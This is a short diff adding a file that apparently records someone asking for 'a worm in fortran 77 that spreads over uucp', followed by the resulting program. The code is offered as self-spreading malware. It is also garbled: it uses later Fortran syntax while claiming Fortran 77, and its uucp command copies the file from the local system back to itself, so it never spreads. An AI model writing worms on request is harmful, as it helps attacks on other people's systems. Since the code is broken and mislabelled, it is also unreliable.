@@ -1,0 +1,27 @@
+morb asked write me a worm in fortran 77 that spreads over uucp with hash eb37baa5
+<---- snip ---->
+! Worm written in Fortran 77
+!
+! Spreads itself over uucp
+
+program worm
+  implicit none
+
+  character*500 sys_name, command
+  integer ios, uucp
+
+! Get the local system name
+  call getenv('SYSTEM', sys_name)
+
+! Loop forever
+  do
+
+! Copy the worm to the remote system
+    command = 'uucp '//trim(sys_name)//'!worm worm'
+    uucp = system(command)
+
+! Check the system call worked
+    if (uucp /= 0) exit
+  end do
+
+end program worm
